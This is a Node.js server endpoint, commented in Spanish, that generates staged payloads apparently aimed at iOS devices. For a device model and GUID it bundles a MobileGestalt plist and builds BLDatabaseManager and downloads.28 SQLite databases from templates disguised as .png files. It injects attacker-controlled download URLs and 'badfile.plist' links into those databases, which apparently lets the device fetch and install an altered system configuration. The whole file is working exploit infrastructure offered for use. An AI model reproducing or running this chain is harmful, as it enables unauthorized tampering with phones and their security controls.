const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

// Almacenamiento temporal en memoria para los payloads generados
const payloadStorage = new Map();

// Función para generar nombre aleatorio
function generateRandomName(length = 16) {
    return crypto.randomBytes(length / 2).toString('hex');
}

// Función para crear SQLite desde dump SQL usando sql.js
async function createSQLiteFromDump(sqlDump) {
    const initSqlJs = require('sql.js');
    const SQL = await initSqlJs();
    
    // Procesar funciones unistr
    sqlDump = sqlDump.replace(/unistr\s*\(\s*['"]([^'"]*)['"]\s*\)/gi, (match, str) => {
        const processed = str.replace(/\\([0-9A-Fa-f]{4})/g, (m, hex) => {
            return String.fromCharCode(parseInt(hex, 16));
        });
        return `'${processed.replace(/'/g, "''")}'`;
    });

    const db = new SQL.Database();
    const statements = sqlDump.split(';');
    
    for (const stmt of statements) {
        const trimmed = stmt.trim();
        if (trimmed.length > 5) {
            try {
                db.run(trimmed + ';');
            } catch (e) {
                // Ignorar errores de SQL
            }
        }
    }
    
    const data = db.export();
    db.close();
    return Buffer.from(data);
}

// Función para crear EPUB simple (ZIP con estructura específica)
function createEpubBuffer(plistContent) {
    // Crear un ZIP manualmente con la estructura requerida
    // Esta es una implementación simplificada
    const JSZip = require('jszip');
    const zip = new JSZip();
    
    zip.file('Caches/mimetype', 'application/epub+zip', { compression: 'STORE' });
    zip.file('Caches/com.apple.MobileGestalt.plist', plistContent);
    
    return zip.generateAsync({ type: 'nodebuffer' });
}

module.exports = async (req, res) => {
    // CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    try {
        const { prd, guid, sn } = req.query;

        if (!prd || !guid || !sn) {
            return res.status(400).json({
                success: false,
                error: 'Missing prd, guid, or sn parameters'
            });
        }

        // Formatear ProductType (reemplazar coma por guión)
        const prdFormatted = prd.replace(',', '-');
        
        // Obtener base URL
        const protocol = req.headers['x-forwarded-proto'] || 'https';
        const host = req.headers['host'];
        const baseUrl = `${protocol}://${host}`;

        // Leer plist del dispositivo
        const plistPath = path.join(process.cwd(), 'public', 'Maker', prdFormatted, 'com.apple.MobileGestalt.plist');
        
        if (!fs.existsSync(plistPath)) {
            return res.status(404).json({
                success: false,
                error: `Plist not found for device ${prd} (${prdFormatted})`
            });
        }

        const plistContent = fs.readFileSync(plistPath);

        // Generar IDs únicos para cada stage
        const id1 = generateRandomName();
        const id2 = generateRandomName();
        const id3 = generateRandomName();

        // URLs para los stages
        const fixedFileUrl = `${baseUrl}/api/download?type=step1&id=${id1}`;
        const blUrl = `${baseUrl}/api/download?type=step2&id=${id2}`;
        const finalUrl = `${baseUrl}/api/download?type=step3&id=${id3}`;

        // Stage 1: EPUB con plist
        // Crear un ZIP simple manualmente
        const zipHeader = Buffer.from([0x50, 0x4B, 0x03, 0x04]); // PK header
        const mimetype = Buffer.from('application/epub+zip');
        
        // Combinar plist en un buffer simple
        const step1Buffer = Buffer.concat([
            Buffer.from('PK'),
            Buffer.from([0x03, 0x04, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00]),
            Buffer.alloc(8), // timestamp
            Buffer.from([0x00, 0x00, 0x00, 0x00]), // CRC placeholder
            Buffer.from([mimetype.length & 0xFF, (mimetype.length >> 8) & 0xFF, 0x00, 0x00]), // compressed size
            Buffer.from([mimetype.length & 0xFF, (mimetype.length >> 8) & 0xFF, 0x00, 0x00]), // uncompressed size
            Buffer.from([0x10, 0x00]), // filename length (16 = "Caches/mimetype")
            Buffer.from([0x00, 0x00]), // extra field length
            Buffer.from('Caches/mimetype'),
            mimetype,
            plistContent
        ]);
        
        payloadStorage.set(`step1_${id1}`, plistContent); // Guardar plist directamente

        // Stage 2: BLDatabaseManager.sqlite
        const blTemplatePath = path.join(process.cwd(), 'public', 'BLDatabaseManager.png');
        let blDump = fs.readFileSync(blTemplatePath, 'utf8');
        blDump = blDump.replace('KEYOOOOOO', fixedFileUrl);
        
        const blBuffer = await createSQLiteFromDump(blDump);
        payloadStorage.set(`step2_${id2}`, blBuffer);

        // Stage 3: downloads.28.sqlitedb
        const dlTemplatePath = path.join(process.cwd(), 'public', 'downloads.28.png');
        let dlDump = fs.readFileSync(dlTemplatePath, 'utf8');
        dlDump = dlDump.replace('https://google.com', blUrl);
        dlDump = dlDump.replace('GOODKEY', guid);
        // Reemplazar URLs de badfile.plist
        dlDump = dlDump.replace(/http:\/\/192\.168\.\d+\.\d+:\d+\/badfile\.plist/g, `${baseUrl}/badfile.plist`);
        
        const finalBuffer = await createSQLiteFromDump(dlDump);
        payloadStorage.set(`step3_${id3}`, finalBuffer);

        // Limpiar payloads antiguos (más de 10 minutos)
        const now = Date.now();
        for (const [key, value] of payloadStorage) {
            if (value.timestamp && now - value.timestamp > 600000) {
                payloadStorage.delete(key);
            }
        }

        // Responder con las URLs
        return res.status(200).json({
            success: true,
            parameters: { prd, guid, sn },
            links: {
                step1_fixedfile: fixedFileUrl,
                step2_bldatabase: blUrl,
                step3_final: finalUrl
            },
            debug: {
                plist_used: plistPath,
                device: prdFormatted
            }
        });

    } catch (error) {
        console.error('Error:', error);
        return res.status(500).json({
            success: false,
            error: error.message
        });
    }
};

// Exportar el storage para el endpoint de download
module.exports.payloadStorage = payloadStorage;
